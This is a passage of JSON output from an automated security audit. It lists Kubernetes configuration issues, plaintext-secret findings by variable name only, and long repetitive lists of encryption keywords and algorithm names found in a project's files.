            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/monitoring.yaml",
            "issues": [
              {
                "issue": "Host network access",
                "severity": "HIGH",
                "recommendation": "Remove hostNetwork: true"
              },
              {
                "issue": "Host PID/IPC access",
                "severity": "HIGH",
                "recommendation": "Remove hostPID/hostIPC: true"
              }
            ],
            "total_issues": 2,
            "critical_issues": 0,
            "high_issues": 2
          },
          {
            "file": "k8s/mcp-deployments.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/network-policies.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-deployment.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/configmaps.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/pod-security-policies.yaml",
            "issues": [
              {
                "issue": "Privileged containers",
                "severity": "CRITICAL",
                "recommendation": "Remove privileged: true"
              },
              {
                "issue": "Privilege escalation allowed",
                "severity": "HIGH",
                "recommendation": "Set allowPrivilegeEscalation: false"
              },
              {
                "issue": "Host network access",
                "severity": "HIGH",
                "recommendation": "Remove hostNetwork: true"
              },
              {
                "issue": "Host PID/IPC access",
                "severity": "HIGH",
                "recommendation": "Remove hostPID/hostIPC: true"
              },
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 5,
            "critical_issues": 1,
            "high_issues": 3
          },
          {
            "file": "k8s/rbac.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-monitoring.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/kubernetes/staging/deployment.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/deployments.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/services.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/secrets.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/namespace.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/configmaps.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/deployments/mcp-production-deployment.yaml",
            "issues": [
              {
                "issue": "Privileged containers",
                "severity": "CRITICAL",
                "recommendation": "Remove privileged: true"
              },
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 2,
            "critical_issues": 1,
            "high_issues": 0
          },
          {
            "file": "deploy/health-checks/standard-checks.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/environments/development.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/servers/brave-search.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/servers/security-scanner.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/markdown_it/port.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/_super_secret_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/proxy_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/_new_new_secret_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/_new_secret_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/model_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/azure_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/simple_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/oai_misc_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/aliases_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/disable_schema_update.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/_health_check_test_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/load_balancer.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/multi_instance_simple_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/spend_tracking_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/otel_test_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/opentelemetry_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/langfuse_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/pass_through_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/enterprise_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/store_model_db_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_learning_system/servers/devops/config/deployment_patterns.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/servers/devops/config/deployment_patterns.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/docker/docker-compose.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/mcp-production-deployment.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/deploy-infrastructure.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/deployment.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/production-deploy.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          }
        ]
      },
      "secrets_management": {
        "secrets_in_env_files": 22,
        "kubernetes_secrets_found": 7,
        "secrets_issues": [
          {
            "file": ".env.production",
            "line": 19,
            "issue": "Potential secret in plain text: JWT_SECRET_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 31,
            "issue": "Potential secret in plain text: ANTHROPIC_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 32,
            "issue": "Potential secret in plain text: OPENAI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 33,
            "issue": "Potential secret in plain text: GOOGLE_GEMINI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 34,
            "issue": "Potential secret in plain text: DEEPSEEK_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 35,
            "issue": "Potential secret in plain text: OPENROUTER_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 5,
            "issue": "Potential secret in plain text: ANTHROPIC_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 6,
            "issue": "Potential secret in plain text: OPENAI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 7,
            "issue": "Potential secret in plain text: GOOGLE_GEMINI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 8,
            "issue": "Potential secret in plain text: DEEPSEEK_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 9,
            "issue": "Potential secret in plain text: OPENROUTER_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 15,
            "issue": "Potential secret in plain text: BRAVE_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 16,
            "issue": "Potential secret in plain text: SLACK_BOT_TOKEN",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 17,
            "issue": "Potential secret in plain text: AWS_ACCESS_KEY_ID",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 18,
            "issue": "Potential secret in plain text: AWS_SECRET_ACCESS_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 20,
            "issue": "Potential secret in plain text: AZURE_DEVOPS_TOKEN",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 58,
            "issue": "Potential secret in plain text: GRAFANA_ADMIN_PASSWORD",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 61,
            "issue": "Potential secret in plain text: ELASTIC_PASSWORD",
            "severity": "HIGH"
          },
          {
            "file": ".env.development",
            "line": 13,
            "issue": "Potential secret in plain text: JWT_SECRET_KEY",
            "severity": "HIGH"
          },
          {
            "file": "mcp_servers/config/api_keys.env",
            "line": 6,
            "issue": "Potential secret in plain text: TAVILY_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": "mcp_servers/config/api_keys.env",
            "line": 9,
            "issue": "Potential secret in plain text: SMITHERY_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": "mcp_servers/config/api_keys.env",
            "line": 12,
            "issue": "Potential secret in plain text: BRAVE_API_KEY",
            "severity": "HIGH"
          }
        ],
        "k8s_secrets_files": [
          "k8s/security-context.yaml",
          "k8s/secrets.yaml",
          "k8s/mcp-deployment.yaml",
          "k8s/mcp-monitoring.yaml",
          "code-base-crawler/code-base-crawler/deploy/kubernetes/staging/deployment.yaml",
          "k8s/production/secrets.yaml",
          "monitoring/production/grafana-stack.yaml"
        ],
        "overall_score": "HIGH_RISK"
      },
      "network_security": {
        "network_policies_found": 8,
        "service_mesh_detected": true,
        "ingress_security": [],
        "tls_configuration": [
          "k8s/services.yaml"
        ]
      }
    },
    "data_protection": {
      "data_at_rest": {
        "database_encryption": true,
        "file_encryption": true,
        "volume_encryption": true,
        "encryption_algorithms": [
          "encrypt.*at.*rest",
          "database.*encrypt",
          "file.*encrypt",
          "volume.*encrypt",
          "aes.*encrypt",
          "rsa.*encrypt",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "aes.*encrypt",
          "aes.*encrypt",
          "rsa.*encrypt",
          "aes.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "aes.*encrypt",
          "aes.*encrypt",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest"
        ]
      },
      "data_in_transit": {
        "https_enforced": true,
        "tls_version": "tls_version\": \"1.3",
        "certificate_validation": true,
        "hsts_headers": true
      },
      "cryptographic_strength": {
        "strong_algorithms": [
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "bcrypt",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "bcrypt",
          "bcrypt",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "bcrypt",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "bcrypt",
          "scrypt",
          "argon2",
          "aes",
          "rsa",
          "rsa",
          "bcrypt",
          "rsa",
          "aes",
          "chacha20",
          "bcrypt",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "aes",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha3",
          "rsa",
          "sha3",
          "sha3",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "rsa",
          "ed25519",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha3",
          "sha256",
          "rsa",
          "ecdsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "sha256",
          "sha3",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "rsa",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "sha256",
          "sha3",
          "aes",
          "sha256",
          "aes",
          "aes",
          "aes",
          "chacha20",
          "aes",
          "aes",
          "chacha20",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "bcrypt",
          "rsa",
          "ed25519",
          "aes",
          "rsa",
          "sha256",
          "sha3",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "ed25519",
          "rsa",
          "scrypt",
          "argon2",
          "sha256",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "scrypt",
          "argon2",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "bcrypt",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "bcrypt",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "bcrypt",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "bcrypt",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "aes",
          "rsa",
          "aes",
          "sha256",
          "aes",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "rsa",
          "aes",
